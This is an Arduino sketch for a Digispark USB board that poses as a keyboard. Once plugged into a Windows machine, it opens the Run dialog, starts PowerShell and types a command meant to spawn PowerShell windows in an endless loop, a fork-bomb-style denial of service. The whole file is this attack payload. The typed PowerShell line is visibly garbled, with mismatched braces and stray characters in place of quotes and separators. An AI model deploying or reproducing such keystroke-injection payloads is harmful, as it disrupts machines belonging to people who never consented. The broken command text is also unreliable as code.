// _                   _     _    _ _  _    ___  _  _   
//| | _______   ____ _| |___| | _(_) || |  / _ \| || |  
//| |/ / _ \ \ / / _` | / __| |/ / | || |_| | | | || |_ 
//|   < (_) \ V / (_| | \__ \   <| |__   _| |_| |__   _|
//|_|\_\___/ \_/ \__,_|_|___/_|\_\_|  |_|  \___/   |_|  



#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("while($true) } Start-Process powershell.exe -ArgumentList \~-NoExit\~ / Invoke-Expression -Command `while($true) } Start-Process powershell.exe -ArgumentList \~-NoExit\~ |`/|");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
for (;;) {
 }
}
